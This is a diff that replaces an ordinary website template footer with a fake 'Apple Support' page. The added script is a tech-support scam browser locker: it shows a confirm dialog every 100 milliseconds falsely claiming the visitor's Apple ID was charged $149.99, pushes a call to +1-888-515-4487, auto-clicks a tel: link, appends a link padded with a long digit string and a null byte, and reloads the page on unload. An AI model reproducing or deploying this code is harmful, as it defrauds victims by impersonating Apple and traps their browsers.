-                                        <img src="img/svg_icon/address.svg" alt="">
-                                    </div>
-                                    <div class="ifno">
-                                        <h4>Address</h4>
-                                        <p>20/D, Kings road, Green lane</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-6">
-                                <div class="single_add d-flex">
-                                    <div class="icon">
-                                        <img src="img/svg_icon/head.svg" alt="">
-                                    </div>
-                                    <div class="ifno">
-                                        <h4>Reservation</h4>
-                                        <p>+10 673 567 367</p>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- footer_start  -->
-    <footer class="footer">
-        <div class="footer_top">
-            <div class="container">
-                <div class="row">
-                    <div class="col-xl-3 col-md-6 col-lg-3 ">
-                        <div class="footer_widget">
-                            <div class="footer_logo">
-                                <a href="#">
-                                    <img src="img/footer_logo.png" alt="">
-                                </a>
-                            </div>
-                            <p>5th flora, 700/D kings road, green <br> lane New York-1782 <br>
-                                <a href="#">+10 367 826 2567</a> <br>
-                                <a href="#">contact@carpenter.com</a>
-                            </p>
-                            <p>
-
-
-
-                            </p>
-                            <div class="socail_links">
-                                <ul>
-                                    <li>
-                                        <a href="#">
-                                            <i class="ti-facebook"></i>
-                                        </a>
-                                    </li>
-                                    <li>
-                                        <a href="#">
-                                            <i class="ti-twitter-alt"></i>
-                                        </a>
-                                    </li>
-                                    <li>
-                                        <a href="#">
-                                            <i class="fa fa-instagram"></i>
-                                        </a>
-                                    </li>
-                                    <li>
-                                        <a href="#">
-                                            <i class="fa fa-pinterest"></i>
-                                        </a>
-                                    </li>
-                                    <li>
-                                        <a href="#">
-                                            <i class="fa fa-youtube-play"></i>
-                                        </a>
-                                    </li>
-                                </ul>
-                            </div>
-
-                        </div>
-                    </div>
-                    <div class="col-xl-4 col-md-6 col-lg-4 offset-xl-1">
-                        <div class="footer_widget">
-                            <h3 class="footer_title">
-                                Useful Links
-                            </h3>
-                            <ul>
-                                <li><a href="#">Menu</a></li>
-                                <li><a href="#">About</a></li>
-                                <li><a href="#"> Blog</a></li>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-515-4487 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
                             </ul>
                         </div>
-                    </div>
-                    <div class="col-xl-4 col-md-6 col-lg-4">
-                        <div class="footer_widget">
-                            <h3 class="footer_title">
-                                Subscribe
-                            </h3>
-                            <form action="#" class="newsletter_form">
-                                <input type="text" placeholder="Enter your mail">
-                                <button type="submit">Subscribe</button>
-                            </form>
-                            <p class="newsletter_text">Esteem spirit temper too say adieus who direct esteem esteems
-                                luckily.</p>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <div class="copy-right_text">
-            <div class="container">
-                <div class="footer_border"></div>
-                <div class="row">
-                    <div class="col-xl-12">
-                        <p class="copy_right text-center">
-                            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-                        </p>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
                     </div>
                 </div>
             </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-888-515-4487
+			 " property="telephone">
+            </section>
         </div>
     </footer>
-    <!-- footer_end  -->
-
-    <!-- JS here -->
-    <script src="js/vendor/modernizr-3.5.0.min.js"></script>
-    <script src="js/vendor/jquery-1.12.4.min.js"></script>
-    <script src="js/popper.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/owl.carousel.min.js"></script>
-    <script src="js/isotope.pkgd.min.js"></script>
-    <script src="js/ajax-form.js"></script>
-    <script src="js/waypoints.min.js"></script>
-    <script src="js/jquery.counterup.min.js"></script>
-    <script src="js/imagesloaded.pkgd.min.js"></script>
-    <script src="js/scrollIt.js"></script>
-    <script src="js/jquery.scrollUp.min.js"></script>
-    <script src="js/wow.min.js"></script>
-    <script src="js/gijgo.min.js"></script>
-    <script src="js/nice-select.min.js"></script>
-    <script src="js/jquery.slicknav.min.js"></script>
-    <script src="js/jquery.magnific-popup.min.js"></script>
-    <script src="js/plugins.js"></script>
 
 
 
-    <!--contact js-->
-    <script src="js/contact.js"></script>
-    <script src="js/jquery.ajaxchimp.min.js"></script>
-    <script src="js/jquery.form.js"></script>
-    <script src="js/jquery.validate.min.js"></script>
-    <script src="js/mail-script.js"></script>
-
-
-    <script src="js/main.js"></script>
-
+    <script src="js/jquery-1.12.0.min.js"></script>
     <script>
-        $('#datepicker').datepicker({
-            iconsLibrary: 'fontawesome',
-            icons: {
-                rightIcon: '<span class="fa fa-calendar-o"></span>'
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
             }
-        });
-        $('#datepicker2').datepicker({
-            iconsLibrary: 'fontawesome',
-            icons: {
-                rightIcon: '<span class="fa fa-calendar-o"></span>'
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-515-4487');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
             }
 
-        });
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-515-4487"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-515-4487 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
-</body>
 
-</html>
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
